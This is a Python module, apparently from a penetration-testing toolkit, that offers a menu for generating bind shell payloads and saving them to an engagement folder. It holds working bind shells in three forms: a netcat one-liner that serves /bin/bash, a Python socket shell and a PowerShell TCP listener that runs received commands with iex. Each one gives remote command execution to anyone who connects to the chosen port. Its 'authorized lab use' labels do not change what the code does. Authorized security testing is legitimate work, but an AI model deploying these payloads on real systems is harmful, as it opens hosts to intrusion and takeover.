import os
from datetime import datetime

# ================= COLORS =================
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

# ================= BANNER =================
BANNER = f"""
{Colors.BLUE}{Colors.BOLD}
╔════════════════════════════════════════════╗
║          BIND SHELL GENERATOR              ║
║        Lab • Authorized Use Only           ║
╚════════════════════════════════════════════╝
{Colors.END}
"""

# ================= SAVE =================
def save_payload(engagement, name, content):
    base = os.path.join(engagement["base"], "payloads")
    os.makedirs(base, exist_ok=True)

    fname = f"{name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    path = os.path.join(base, fname)

    with open(path, "w") as f:
        f.write(content)

    return path


# ================= PAYLOADS =================
def linux_bash_bind(port):
    return f"""# Linux Bash Bind Shell (Lab Use)
nc -lvnp {port} -e /bin/bash
"""


def python_bind(port):
    return f"""# Python Bind Shell (Lab Use)
import socket,subprocess,os
s=socket.socket()
s.bind(("0.0.0.0",{port}))
s.listen(1)
c,a=s.accept()
os.dup2(c.fileno(),0)
os.dup2(c.fileno(),1)
os.dup2(c.fileno(),2)
subprocess.call(["/bin/sh","-i"])
"""


def powershell_bind(port):
    return f"""# PowerShell Bind Shell (Lab Use)
$listener = New-Object System.Net.Sockets.TcpListener({port})
$listener.start()
$client = $listener.AcceptTcpClient()
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{{0}}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
 $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i)
 $sendback = (iex $data 2>&1 | Out-String )
 $sendback2  = $sendback + "PS> "
 $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
 $stream.Write($sendbyte,0,$sendbyte.Length)
 $stream.Flush()
}}
$client.Close()
"""


# ================= MENU =================
def menu():
    print(f"""
{Colors.WHITE}[1] Linux Bash Bind Shell{Colors.END}
{Colors.WHITE}[2] Python Bind Shell{Colors.END}
{Colors.WHITE}[3] PowerShell Bind Shell{Colors.END}
{Colors.RED}[4] Back{Colors.END}
""")
    return input("Select payload type: ").strip()


# ================= MAIN =================
def run(engagement):
    print(BANNER)

    while True:
        choice = menu()

        if choice == "4":
            return

        port = input(f"{Colors.YELLOW}[*] Bind Port: {Colors.END}").strip()

        if not port.isdigit():
            print(f"{Colors.RED}[!] Invalid port{Colors.END}")
            continue

        if choice == "1":
            payload = linux_bash_bind(port)
            name = "bash_bind"

        elif choice == "2":
            payload = python_bind(port)
            name = "python_bind"

        elif choice == "3":
            payload = powershell_bind(port)
            name = "powershell_bind"

        else:
            print(f"{Colors.RED}[!] Invalid option{Colors.END}")
            continue

        print(f"\n{Colors.GREEN}Generated Payload:{Colors.END}\n")
        print(payload)

        path = save_payload(engagement, name, payload)

        print(f"\n{Colors.BLUE}[+] Saved to:{Colors.END} {path}")
        print(f"{Colors.YELLOW}[*] Use only in authorized lab environments{Colors.END}")
